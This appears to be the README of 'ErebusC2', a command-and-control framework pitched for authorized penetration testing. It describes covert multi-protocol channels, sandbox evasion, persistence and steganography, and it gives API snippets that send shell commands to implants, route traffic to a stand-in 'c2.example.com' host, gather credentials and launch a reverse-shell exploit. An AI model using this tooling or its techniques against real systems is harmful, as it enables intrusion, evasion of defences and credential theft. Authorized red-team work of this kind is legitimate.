# ErebusC2: Ethical Command and Control Framework

## Command and Control Framework for Ethical Security Testing

ErebusC2 is an advanced Command and Control (C2) framework designed specifically for cybersecurity professionals conducting authorized security testing and ethical penetration testing scenarios.

## Table of Contents

- [Overview](#overview)
- [Framework Architecture](#framework-architecture)
- [Core Components](#core-components)
- [Communication Protocols](#communication-protocols)
- [Key Features](#key-features)
- [Installation](#installation)
- [Basic Usage](#basic-usage)
- [Security Considerations](#security-considerations)
- [Development](#development)
- [License and Disclaimer](#license-and-disclaimer)

## Overview

ErebusC2 provides a modular architecture for establishing and maintaining secure communication channels between implants (agents) and command servers. The framework prioritizes stealth, encryption, persistence, and adaptability across various protocols to evade detection.

## Framework Architecture

The ErebusC2 framework consists of specialized modules working together to provide a comprehensive C2 solution:

- **BlackEcho**: Core stealth communication framework
- **BlackCypher**: Encryption and traffic obfuscation engine
- **BlackRelay**: Multi-protocol relay system
- **BlackPhoenix**: Resilience and recovery mechanisms
- **BlackPulse**: Implant health monitoring
- **BlackReign**: AI-driven strategy engine
- **BlackFall/BlackTalon**: Post-exploitation capabilities

### Key Features

- **Multi-protocol support**: HTTP(S), DNS, SMB, WebSockets, custom TCP/UDP, ICMP
- **Advanced stealth**: Protocol spoofing, traffic obfuscation, sandbox evasion
- **Strong encryption**: RSA (2048/4096-bit) and AES (256-bit)
- **Resilience mechanisms**: Automatic recovery, multiple persistence techniques
- **Traffic obfuscation**: Mimics legitimate network patterns

### Security and Ethical Considerations

This framework is intended **exclusively** for authorized security testing by cybersecurity professionals. Misuse of this tool may result in severe legal consequences, including criminal charges, civil liabilities, and reputational damage. Usage requires explicit permission from system owners and must comply with all applicable laws, regulations, and ethical guidelines. Users are solely responsible for ensuring compliance and understanding the risks associated with unauthorized activities.

### Documentation Sections

- Overview and architecture
- Installation and configuration
- Server operations
- Implant communication
- Protocol handlers
- Encryption and steganography
- Relay management
- Persistence techniques
- API reference
- Ethical usage guidelines

### License and Disclaimer

For authorized security testing only. Users are responsible for ensuring all activities remain within legal and ethical boundaries.

## Core Components

### BlackEcho

The stealth communication framework responsible for maintaining covert C2 channels:

- [`CommandCenter`](blackecho/blackecho_command_center.py): Core C2 server managing implant communications
- [`StealthCore`](blackecho/blackecho_stealth_core.py): Provides protocol spoofing and sandbox evasion techniques
- [`ChannelManager`](blackecho/blackecho_channel_manager.py): Handles different communication protocols
- [`Implant`](blackecho/blackecho_implant.py): Client-side component executed on target systems

### BlackCypher

Handles encryption, traffic obfuscation, and data hiding:

- Advanced encryption with RSA (2048/4096-bit) and AES (256-bit)
- Traffic obfuscation to disguise C2 communications as legitimate traffic
- Steganography capabilities for hiding data in common file formats

### BlackRelay

Communication relay system with traffic obfuscation:

- [`RelayNode`](blackrelay/blackrelay_relay_core.py): Forwards traffic between implants and C2 servers
- [`RelayManager`](blackrelay/blackrelay_relay_management.py): Manages relay nodes and protocols
- Support for multiple protocols: HTTP, HTTPS, DNS, SMB, custom TCP/UDP, WebSockets, and ICMP

### BlackPhoenix

System resilience and recovery engine:

- [`RecoveryEngine`](blackphoenix/blackphoenix_recovery_engine.py): Core engine for system resilience
- [`PersistenceMechanism`](blackphoenix/blackphoenix_persistence_mechanism.py): Ensures implant persistence
- Multiple persistence techniques across different operating systems

### BlackPulse

Heartbeat monitoring and implant health tracking:

- [`HeartbeatMonitor`](blackpulse/blackpulse_heartbeat_monitor.py): Monitors implant activity and health
- Alert mechanisms for offline or compromised implants

### BlackReign

AI-driven strategy engine:

- [`StrategyEngine`](blackreign/blackreign_strategy_engine.py): Decision-making and strategy formulation
- [`IntelligenceGathering`](blackreign/blackreign_intelligence_gathering.py): Target information collection

### BlackFall & BlackTalon

Post-exploitation and exploitation frameworks:

- [`PostExploitation`](blackfall/blackfall_post_exploitation.py): Post-exploitation actions and payloads
- [`ExploitationFramework`](blacktalon/blacktalon_exploitation.py): Vulnerability scanning and exploitation capabilities

## Server Architecture

The server component [`ErebusC2Server`](server/server___init__.py) coordinates all modules:

- [`ServerAPI`](server/server_api.py): REST API for command and control
- [`PeerTracker`](server/server_peer_tracker.py): Tracks implants and relays
- [`CommandQueue`](server/server_command_queue.py): Manages command delivery to implants
- [`TrafficManager`](server/server_api.py): Routes C2 traffic

## Communication Protocols

ErebusC2 supports multiple covert communication protocols, each tailored for specific use cases:

- **HTTP/HTTPS with traffic mimicry**: Ideal for blending in with normal web traffic to avoid detection.
- **DNS with domain fronting**: Useful for bypassing network restrictions and firewalls by leveraging DNS queries.
- **SMB/file-based communications**: Suitable for environments where file-sharing protocols are prevalent.
- **Custom TCP/UDP protocols**: Provides flexibility for specialized communication needs.
- **WebSockets**: Enables real-time, bidirectional communication over a single TCP connection.
- **ICMP (requires root privileges)**: Effective for covert communication in restricted environments where other protocols are blocked.

## Configuration

Each component uses YAML files for configuration:

- BlackRelay: [`blackrelay_relay_config.yaml`](blackrelay/blackrelay_relay_config.yaml)
- BlackEcho: [`blackecho_stealth_config.yaml`](blackecho/blackecho_stealth_config.yaml)
- BlackReign: [`blackreign_config.yaml`](blackreign/blackreign_config.yaml)

Example configuration for HTTP protocol:

```yaml
protocols:
  http:
    enabled: true
    port: 8080
    path: "/api/data"
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
```

## Key Features

### Stealth Capabilities
- Protocol spoofing to evade network detection by imitating legitimate protocols such as HTTP, HTTPS, and DNS.
- Traffic obfuscation mimicking legitimate protocols, for example, disguising C2 traffic as normal web browsing or DNS queries.
- Sandbox evasion techniques to detect and bypass virtualized or monitored environments.

### Resilience
- Automatic recovery from system failures
- Multiple persistence mechanisms
- Communication channel rotation
- Component reinstallation

### Multi-Protocol Support
- HTTP/HTTPS with header customization
- DNS with various record types
- Custom binary protocols
- File-based communications via SMB

### Security
- Asymmetric encryption (RSA) for key exchange
- Symmetric encryption (AES) for data
- Key rotation and certificate management

## Installation

1. Clone the repository
2. Install dependencies:
   - Python 3.8 or higher
   - Required Python packages (listed in `requirements.txt`)
     ```bash
     pip install -r requirements.txt
     ```
### Starting the Server
4. Start the ErebusC2 server

## Basic Usage

### Starting the Server
```python
from server import create_server

# Create and start the server
server = create_server(config_path="server_config.yaml")
server.start()

# Access server components
api = server.api
peer_tracker = server.peer_tracker
command_queue = server.command_queue

# Add a command to the queue
command_id = command_queue.add_command(
    implant_id="target-implant-id",
    command_type="shell_exec",
    params={"command": "whoami"}
)

# Get command result
result = command_queue.get_command_result(command_id)
```

### Connecting an Implant
Implants connect to the C2 server through a relay network:

1. Register with the C2 server
2. Establish encrypted communication channel
3. Begin receiving commands and sending responses

**Note:** The use of implants must adhere to strict ethical guidelines and legal boundaries. Implants should only be deployed in environments where you have obtained explicit, written authorization from the system owner or an authorized representative. Unauthorized deployment of implants is a serious violation of ethical standards and legal regulations, potentially resulting in criminal charges, civil liabilities, and reputational damage. Always ensure that your actions comply with applicable laws, organizational policies, and ethical guidelines to avoid unintended consequences or harm.

### Command and Control
Send commands to implants through the server API:

```python
# Add a command to the queue
command_id = server.command_queue.add_command(
    implant_id="target-implant-id",
    command_type="shell_exec",
    params={"command": "whoami"}
)

# Get command result
result = server.command_queue.get_command_result(command_id)
```

### Encryption, Traffic Obfuscation, and Steganography
```python
from blackcypher.encryption import AsymmetricEncryption, SymmetricEncryption
from blackcypher.traffic_obfuscator import TrafficObfuscator
from blackcypher.steganography import DocumentSteganography

# Asymmetric encryption for key exchange
asymmetric = AsymmetricEncryption()
public_key, private_key = asymmetric.generate_key_pair()
encrypted_data = asymmetric.encrypt(data, public_key)
decrypted_data = asymmetric.decrypt(encrypted_data, private_key)

# Symmetric encryption for bulk data
symmetric = SymmetricEncryption()
key = symmetric.generate_key()
encrypted = symmetric.encrypt(data, key)
decrypted = symmetric.decrypt(encrypted, key)

# Traffic obfuscation
obfuscator = TrafficObfuscator()
disguised_traffic = obfuscator.disguise_as_http(c2_traffic)

# Steganography
steganography = DocumentSteganography()
doc_with_hidden_data = steganography.hide_data(document_file, secret_data)
extracted_data = steganography.extract_data(doc_with_hidden_data)
```

### Relay Node and Traffic Routing
```python
from blackrelay.blackrelay_relay_core import RelayNode
from blackrelay.blackrelay_relay_management import RelayManager

# Initialize a relay node
relay_node = RelayNode(config_path="blackrelay/blackrelay_relay_config.yaml")

# Start the relay node
relay_node.start()

# Initialize relay manager
relay_manager = RelayManager()

# Add a new relay node
relay_manager.add_relay(
    address="relay1.example.com",
    port=443,
    protocol="https"
)

# Route traffic through relays
encrypted_traffic = relay_manager.route_traffic(
    data=command_data,
    target_address="c2.example.com"
)
```

### Persistence and Recovery
```python
from blackphoenix.blackphoenix_persistence_mechanism import PersistenceMechanism
from blackphoenix.blackphoenix_recovery_engine import RecoveryEngine

# Initialize persistence mechanism
persistence = PersistenceMechanism(config_path="blackphoenix/config.yaml")

# Install persistence mechanisms based on OS
persistence.install()

# Check persistence status
status = persistence.check_status()

# Initialize recovery engine
recovery = RecoveryEngine()

# Register component for recovery monitoring
recovery.register_component("implant", restart_function=restart_implant)

# Start recovery monitoring
recovery.start()
```

### Heartbeat Monitoring
```python
from blackpulse.blackpulse_heartbeat_monitor import HeartbeatMonitor

# Initialize heartbeat monitor
monitor = HeartbeatMonitor()

# Register an implant for monitoring
monitor.register_implant("implant-001", expected_interval=60)  # 60 seconds

# Process a heartbeat from an implant
monitor.process_heartbeat("implant-001")

# Register alert handler
def alert_handler(implant_id, alert_type, details):
    print(f"Alert for {implant_id}: {alert_type} - {details}")

monitor.register_alert_handler(alert_handler)

# Start the monitor
monitor.start()
```

### Post-Exploitation and Exploitation
```python
from blackfall.post_exploitation import PostExploitation
from blacktalon.exploitation_framework import ExploitationFramework

# Initialize post-exploitation module
post_exploit = PostExploitation()

# Execute post-exploitation actions
post_exploit.gather_credentials(target="compromised-host")
post_exploit.establish_persistence(target="compromised-host")
post_exploit.lateral_movement(source="compromised-host", target="internal-server")

# Initialize exploitation framework
exploitation = ExploitationFramework()

# Scan for vulnerabilities
vulnerabilities = exploitation.scan_target("192.168.1.50")

# Exploit vulnerable service
exploit_result = exploitation.exploit_vulnerability(
    target="192.168.1.50",
    vulnerability_id="CVE-2023-1234",
    payload="reverse_shell"
)
```

## Security Considerations

- All communications are encrypted, ensuring secure data exchange.
- Traffic obfuscation to avoid pattern detection:
  - Obfuscation techniques include randomizing packet sizes, introducing delays, and mimicking legitimate traffic patterns such as web browsing or DNS queries.
  - Examples of patterns avoided include consistent packet sizes, predictable timing intervals, and unencrypted payloads that could be flagged by intrusion detection systems.
- Heartbeat monitoring for implant health
- Strategy engine for adapting operations based on threat level
- Heartbeat monitoring for implant health
- Strategy engine for adapting operations based on threat level

## Development

### Adding New Protocol Handlers

Create a new protocol handler by extending the base classes:

```python
from blackrelay.stealth_proxy import StealthProxy

class CustomProtocolHandler(StealthProxy):
    def __init__(self, config):
        super().__init__(config)
        # Custom initialization
        self.config = config

    def start(self):
        # Start the handler
        print(f"Starting custom protocol handler with config: {self.config}")

    def send_data(self, data, session_id=None):
        # Send data using custom protocol
        print(f"Sending data: {data} to session: {session_id}")

# Example usage
if __name__ == "__main__":
    config = {"protocol": "custom", "port": 12345}
    handler = CustomProtocolHandler(config)
    handler.start()
    handler.send_data("Test data", session_id="session-001")
```

### Creating Custom Commands

Register new command handlers in the command center:

```python
command_center.register_handler("custom_command", custom_handler_function)
```

## License and Disclaimer

This framework is intended for authorized security testing only. Unauthorized use of this tool is strictly prohibited and may result in severe legal consequences, including criminal charges, civil liabilities, and reputational damage. Use responsibly and ethically, and only in environments where you have explicit, written permission to operate. Users are solely responsible for ensuring compliance with all applicable laws, regulations, and ethical guidelines.

# Disclaimer

**IMPORTANT: READ BEFORE USE**

# HTTP protocol configuration
# Note: Customize the headers below to mimic specific client behavior or meet application requirements.
protocols:
  http:
    enabled: true
    port: 8080
    path: "/api/data"
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"

# DNS protocol configuration
  dns:
    enabled: true
    port: 53
    domain: "c2.example.com"
    record_types: ["TXT", "A"]
    ttl: 300

## Framework Architecture Diagram

```plaintext
                        ┌───────────────────┐
                        │    ErebusC2       │
                        │    Dashboard      │
                        └─────────┬─────────┘
                                  │
                                  ▼
                        ┌───────────────────┐
                        │      Server       │
                        │  (Coordination)   │
                        └─────────┬─────────┘
                                  │
             ┌────────────────────┼────────────────────┐
             │                    │                    │
    ┌────────▼────────┐  ┌────────▼────────┐  ┌────────▼────────┐
    │    BlackEcho    │  │    BlackRelay   │  │    BlackCypher  │
    │(Communication)  │  │ (Traffic Relay) │  │  (Encryption)   │
    └────────┬────────┘  └────────┬────────┘  └────────┬────────┘
             │                    │                    │
             └───────────┬────────┴──────────┬────────┘
                         │                   │
                ┌────────▼────────┐ ┌────────▼────────┐
                │   BlackPhoenix  │ │    BlackPulse   │
                │  (Resilience)   │ │   (Heartbeat)   │
                └────────┬────────┘ └────────┬────────┘
                         │                   │
                         └─────────┬─────────┘
                                   │
                  ┌────────────────┴────────────────┐
                  │                                 │
         ┌────────▼────────┐             ┌──────────▼─────────┐
         │    BlackReign   │             │  BlackFall/Talon   │
         │   (Strategy)    │             │(Exploitation)      │
         └─────────────────┘             └────────────────────┘
```
